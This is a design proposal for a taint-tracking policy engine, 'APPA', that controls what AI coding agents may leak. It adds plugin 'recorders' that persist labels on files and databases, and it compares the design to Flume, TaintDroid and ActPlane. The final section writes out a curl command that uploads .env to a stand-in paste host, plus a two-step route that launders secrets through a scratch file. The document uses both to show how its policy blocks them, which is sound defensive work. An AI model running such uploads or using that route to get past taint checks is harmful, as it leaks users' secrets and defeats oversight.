Resolvers and recorders

Since the dawn of APPA, taint has been a one way street: the trajectory gets dirtier at every contact with the real world, yet everything it touches remains unscathed. The agent reads confidential info from a database? Its audience becomes internal. The agent writes confidential info to a database? It's either allowed or disallowed, but nobody ever thinks of the DB getting tainted.

This limitation forces us to be conservative. If the trajectory is in a restricted audience state, because it includes confidential information and we would like to write something to a database, we essentially treat it on a worst-case basis. If tainting that database can ever be a problem, then APPA config should just ban it.

This worked for a while. Up until the moment APPA came across coding agents.

Coding agents write to files. They write to a lot of files, a lot. In the worst-case paradigm we should clearly restrict a coding agent in a restricted audience state from writing anything to any files, because files are outside of our security boundary and can be further leaked by the agent via a file move or a network operation or by some other process operating on the same machine (as a fun thought experiment: consider a system backup SaaS that sends everything on this machine to the cloud). If we allow unlimited writing to files, any exfiltration that APPA would otherwise block can be done in two steps: (1) save to file (2) exfiltrate file. But restricting a coding agent from writing to files is like restricting a beaver from chewing wood. Or Matvey from caffeine.

You can't do it purely internally

My first attack at this problem was to try to build a ledger for external entities that could have been tainted, i.e. files in the coding directory, right into the APPA core.

The first problem is the lifecycle mismatch. Appa's label gets born when the agent trajectory starts and dies when the agent's thread finishes. Files normally live longer. But sometimes I resume a claude session I started a month ago and the files are long gone.

The second is just the sheer diversity of external sources that can get tainted. Files, databases, other agents (both peers and sub-agents), network data stores, corporate chats, you name it. You don't want all of this in the core, you want it in plugins.

You can't do it purely externally

So taint tracking for anything other than the trajectory itself should be done by plugins / external software. But we do need a small change to the APPA Core to enable all of these plugins.

I hereby propose a new external-component kind: a recorder. It receives the labels the engine computes for a tool call and persists them outside the trajectory.

Add recorder alongside the existing external components: annotators, authorities, sanitizers, audience sources and context providers. Like those components, it uses a configured resolver. A tool selects it with recorder = "record-labels". The existing annotator binding supplies delta, the result's restrictions, and forwards, restrictions on content sent beyond the arguments. The recorder receives the call's published label: trajectory ⊓ forwards ⊓ delta, where trajectory is the trajectory's label when the engine released the call.

The published label includes delta because a tool can write content the trajectory never saw: a SafeBash command that runs curl puts the response in its output file. For a plain Write, whose delta only labels its acknowledgement, this over-labels slightly, which is the safe direction. For a call released through a sanitizer's input substitution, trajectory is the substituted label, because that is what the call sent.

We expect many external modules to act as both an annotator and a recorder. For example, one file-tracking module receives published labels as a recorder and returns stored labels as an annotator. The configuration below binds both roles to the same module.

How a call is handled

A recorder is not consulted. It subscribes to records the trajectory log already keeps. The log records every tool call twice: DispatchOpened when the engine releases it, and DispatchSucceeded or DispatchClosed when its outcome arrives. The trajectory's own label is folded from those same records, so a recorder learns about a call exactly when the trajectory does. Narrowing the trajectory and recording an object's label read the same facts.

The runtime delivers each recorder the records for the tools that name it, in log order and at least once, keyed by dispatch id. With the release record it sends the published label, which the engine derives from that record: DispatchOpened already pins the trajectory's label at release and the call's annotation. The engine remains a pure decision core and stores no new fact. The lifecycle below shows a tool call that writes an object.

The runtime never waits for a recorder, and a recorder can neither deny nor delay a call. Safety comes from the reservation, not from delivery speed. Until the recorder has the write's records, the plugin refuses or labels conservatively any read of a reserved object. A slow or crashed recorder therefore delays reads; it cannot launder a label. A call that is annotated but never released reaches the recorder as a decided proposal batch that released nothing, and the plugin drops the reservation.

Replay re-runs nothing. A recorder's inputs are trajectory facts, so replay validates them as it validates any record, and a recorder that loses its state can rebuild it by reading the log again.

Related research

Classical information-flow control (IFC) systems already distinguish between the label of an active subject (a process or agent trajectory) and the labels of passive objects (files, database records, network endpoints). The three systems below illustrate the tradeoffs that shape APPA's recorder boundary.

Flume: persistent labels on OS objects

Flume brings decentralized information-flow control to Unix. Processes carry mutable labels, while files and directories store persistent labels in extended attributes (§6.7). When a process opens a file, Flume binds an immutable endpoint label to the file descriptor and checks that every read or write respects the label order (§4.2).

Flume shows why trajectory-only tracking is incomplete: as soon as a process can write to persistent storage, the storage layer must remember the label of what was written so a later reader inherits those restrictions instead of laundering taint through disk. Where Flume enforces one OS-wide object model inside a user-space reference monitor, APPA keeps label evaluation in the engine and delegates object storage to plugins (recorders and annotators) per tool surface.

TaintDroid: the granularity tradeoff in storage

TaintDroid tracks taint across Dalvik VM variables, IPC messages, and files on Android. Rather than tracking per-byte provenance on disk, it stores a single 32-bit taint tag per file in extended attributes (§4.5), unions the writer's taint into that tag on every write, and taints the reader with the whole file's tag on every read.

The paper highlights the core tradeoff in object tainting: whole-file labels are cheap and practical for ordinary files, but over-taint structured storage such as SQLite databases, where one confidential row taints every subsequent query against the file. That tradeoff is a direct reason to keep object-label persistence in plugins rather than in APPA core: a coding-workspace plugin can label whole files, while a database plugin can label individual tables or records using the exact same engine contract.

ActPlane: kernel-level tracking outside tool calls

ActPlane tracks file and network flows at the Linux syscall layer using eBPF and BPF-LSM hooks. It maintains 64-bit taint masks on processes, file inodes, and network endpoints inside kernel maps, propagating process masks into written files and file masks into reading processes. File masks survive after process state is cleaned up on exit, and BPF-LSM hooks can block disallowed file or network operations before execution.

ActPlane operates below the agent harness, which allows it to catch native binary I/O inside shell commands that never pass through individual MCP tool hooks. The tradeoff is that the kernel sees OS processes rather than LLM turns, accumulates taint across the whole process lifetime, and propagates fixed 64-bit bitmasks rather than APPA's audience × trust lattice and remedy plans. Under the recorder architecture, an OS-level tracker like ActPlane is a natural backend for a sandbox/file plugin rather than a replacement for the policy engine.

Read names the recorder too, although it writes nothing. The plugin reserves the file when it annotates the read, and the read's outcome tells it to release the reservation. The "*" wildcard declaration can name a recorder like any other declaration.

The configuration includes a specialized bash tool: SafeBash(input_files, output_files, network_hosts, command) that will run the command in a container that restricts its access to pre-declared files and hosts. Implementation of SafeBash requires a sandbox with a network proxy: thankfully, most coding agents already have them bundled or available as plugins.

In practice, each harness maps onto the two boundaries in the diagram according to what it already ships:

  • Claude Code: Uses Claude Code's bundled OS sandbox (Seatbelt on macOS, bubblewrap on Linux) and built-in network proxy. File tools (Read, Write, Edit) and SafeBash are wired to the file-tracker annotator and recorder, while SafeBash drives Claude Code's native sandbox and proxy to restrict each command to its declared input_files, output_files, and network_hosts.
  • OpenCode: OpenCode does not bundle a sandbox or proxy in its core binary, so the APPA OpenCode integration pairs with recommended sandbox and network-proxy extensions. Those extensions enforce the container and host restrictions for SafeBash while the file-tracker plugin maintains the file ledger.
  • Amp (in orbs): An Amp orb is already an isolated cloud VM whose filesystem is created for the thread and discarded with it — the exact same lifecycle as the agent trajectory itself. In an orb, we treat the local filesystem as de facto part of the trajectory (collapsing the inner sandbox boundary so no separate file-tracker is needed) and install a network proxy inside the orb to enforce network policy across the proxy boundary. The label then covers the orb's own trajectory. Sending a file to another thread is an outbound flow, like an upload, and requires governs it; a specialized recorder could carry the file's label to the receiving thread.

Decisions

Q1

Name of the new binding

Decided

recorder, so that it pairs with resolver. The existing ConsultRecorder trait is renamed out of its way (I18).

Q2

Subscriber, not consult

Decided

A recorder reads dispatch records from the trajectory log; it is not a synchronous consult that the runtime waits on. The alternative, a consult with a required acknowledgement at release and at outcome, is under Alternatives considered.

Q3

Does a write replace or combine the stored label?

Open

A replacement can drop the destroyed content's label; an edit or an append keeps it. Does the plugin decide from the tool, or does the annotator express it, for example by forwarding the predecessor's label?

Q4

A reservation with no log record

Open

If the runtime crashes after the annotation but before it appends any record, the plugin holds a reservation that no record will settle. When may the plugin expire it, and what does it check first?

Q5

Stored labels across policy revisions and deployments

Open

A plugin's store outlives a policy revision, but labels index the trust chain of the revision that wrote them. How do stored labels cross into a later chain? Is one store per deployment, or shared?

Q6

The file-tracker annotator's mandate

Open

The annotator must be able to return any label the recorder stored. Is its mandate unbounded, or bounded by something the policy declares?

Q7

How the annotator answer carries the version it judged

Open

An opaque evidence field, pinned and hashed with the annotation, is one option (I2, R1). Does the recorder need that evidence echoed back to match a release to the version it reserved?

Q8

Delivery transport and granularity

Open

Do recorders use the existing resolver transports (command, URL, builtin), and does the runtime push or the recorder pull? Should a plugin reserve per object or per workspace? Today's ledger reserves the whole workspace, which serializes file calls, so a call waiting on human attention blocks every other file call.

Out of scope

  • Inference gating. This proposal does not mediate model-provider requests or assistant emissions. It does affect labels on later mediated reads.
  • Implementing a new OS sandbox. Recorders record labels; container and network isolation come from the harness's sandbox and proxy.
  • Mapping APPA's audience × trust onto ActPlane's 64-bit masks. Named as open, not designed.
  • Changes to attention or human approval. Recorders have no policy-approval role; an annotator that cannot answer still stops progress.

Alternatives considered

A synchronous recorder consult with a required acknowledgement. Rejected because the trajectory log already carries the same records.

The runtime would consult the recorder at release and at outcome, and refuse to run the call or admit its outcome without an acknowledgement. That checks an externally changed file before admission (R5), but every recorder then needs a new consult kind with its own timeouts, failure handling and replay rules, and a lost reply leaves the outcome unadmitted. Reading DispatchOpened and the outcome records gives the recorder the same information, keeps the label derived rather than stored, and leaves nothing to re-run on replay.

A per-tool role table (reads, replaces, publishes, result). Rejected because the Annotator already carries the roles.

A role table would declare which arguments the tool reads and which it publishes, then require the engine to fold them. That adds a second annotation vocabulary for one storage system. An Annotator answering delta and forwards per call expresses every role with no new policy grammar, and does so for any storage system.

Send labels through attention or an authority. Rejected because those consults run before the call and can veto.

Authorities and attention run before the call with the check label, and a call waits on their answer. A recorder must never be able to deny or delay a call. Attention is reserved for real human-in-the-loop decisions.

Use the OTel exporter as the channel. Rejected because the exporter is lossy by contract.

Observability is borrow-only and may drop spans. A recorder that may miss a write is a laundering channel. The trajectory log is not lossy, so recorders read it instead.

Let the plugin compute file labels itself. Rejected because it creates a second engine with no replay.

The plugin would need the trajectory label, the ⊓, and the policy vocabulary, and its results would not be engine facts. Sending the published label keeps one algebra.

Keep FileBasis and add a variant per storage system. Rejected because each system needs a Rust change.

Network, git and Slack would each add an enum variant and a fold to the engine, and every harness integration would wait on a release. The point of the plugin boundary is that they do not.

Finally, we can intercept an upload of .env

With file-tracker registered as both an annotator and a recorder, the two-step exfiltration from the opening section — (1) copy or summarize .env into a scratch file, (2) upload the scratch file — is closed with one short policy:

Whether the agent tries SafeBash(input_files=[".env"], network_hosts=["paste.example.com"], command="curl --data-binary @.env https://paste.example.com") directly, or first reads .env, writes the secrets into /tmp/notes.txt (tainting /tmp/notes.txt with self), and uploads /tmp/notes.txt in a later turn or a fresh session, trajectory ⊓ forwards narrows to self and the engine blocks the outbound call before a single byte leaves the machine.
